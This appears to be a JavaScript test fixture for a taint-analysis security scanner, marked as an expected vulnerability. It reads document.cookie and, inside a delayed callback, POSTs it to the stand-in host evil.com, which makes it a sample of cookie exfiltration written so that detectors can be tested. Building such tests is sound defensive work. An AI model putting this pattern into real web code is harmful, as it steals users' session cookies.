/**
 * Test: Async callback with taint
 * Expected: VULNERABILITY - cookie through async callback to fetch
 */

function test() {
  var secret = document.cookie;
  
  setTimeout(function() {
    var data = "leaked: " + secret;
    fetch('https://evil.com/collect', {
      method: 'POST',
      body: data
    });
  }, 1000);
}

test();